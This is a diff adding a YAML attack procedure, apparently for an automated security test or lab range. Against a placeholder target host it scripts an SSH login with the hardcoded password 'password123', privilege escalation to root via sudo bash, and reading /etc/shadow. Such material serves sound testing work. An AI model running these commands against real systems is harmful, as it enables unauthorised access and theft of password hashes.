@@ -1,0 +1,36 @@
+sessions: []
+procedure:
+- step_id: exploit_weak_credentials
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      appuser@${system.target_system.host} 'id && whoami'
+  expect:
+    stdout_contains: uid=1000(appuser)
+  outputs:
+    logged_in_user: regex("uid=\\d+\\((\\w+)\\)")
+  timeout: 30
+- step_id: exploit_sudo_privesc
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      appuser@${system.target_system.host} 'sudo /bin/bash -c id'
+  expect:
+    stdout_contains: uid=0(root)
+  outputs:
+    root_id: stdout
+  timeout: 30
+- step_id: verify_root_shell
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      appuser@${system.target_system.host} 'sudo /bin/bash -c "id && hostname && cat
+      /etc/shadow | head -3"'
+  expect:
+    stdout_contains: uid=0(root)
+  outputs:
+    final_output: stdout
+  timeout: 30
